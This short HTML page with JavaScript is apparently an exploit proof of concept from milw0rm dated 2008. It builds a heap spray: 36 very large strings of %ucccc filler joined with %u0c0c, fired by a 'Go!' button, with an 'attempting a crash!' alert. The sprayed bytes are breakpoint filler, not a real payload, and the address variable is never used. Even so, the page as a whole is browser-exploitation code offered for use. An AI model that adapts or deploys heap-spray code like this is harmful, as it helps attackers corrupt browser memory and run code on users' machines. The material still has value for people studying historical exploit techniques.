<html><body><script>

function Demo() {

	var shellcode;
	var addr;
	var fill;
			
	alert('attempting a crash!');
	shellcode = unescape('%u0c0c');
	fill = unescape('%ucccc');
	addr = 0x02020202;
		
	var b = fill;
	while (b.length <= 0x40000) b+=b;

	var c = new Array();
	for (var i =0; i<36; i++) {
		c[i] = 
			b.substring(0,  0x100000 - shellcode.length) + shellcode +
			b.substring(0,  0x100000 - shellcode.length) + shellcode + 
			b.substring(0,  0x100000 - shellcode.length) + shellcode + 
			b.substring(0,  0x100000 - shellcode.length) + shellcode;
	}
	
}

</script>

<input type='button' onClick='Demo()' value='Go!'>

</body></html>

# milw0rm.com [2008-01-24]